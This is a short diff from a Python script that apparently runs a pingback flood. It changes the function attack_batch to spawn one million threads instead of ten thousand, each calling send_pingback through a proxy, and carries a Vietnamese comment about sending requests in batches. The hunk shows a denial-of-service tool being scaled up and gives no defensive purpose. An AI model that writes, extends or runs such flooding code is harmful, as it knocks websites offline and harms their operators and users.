@@ -82,7 +82,7 @@ def send_pingback(proxy=None):
         print(f"Error: {e}")
 
 # Gửi hàng loạt yêu cầu trong một batch
-def attack_batch(proxy, num_requests=10000):
+def attack_batch(proxy, num_requests=1000000):
     threads = []
     for _ in range(num_requests):
         thread = threading.Thread(target=send_pingback, args=(proxy,))
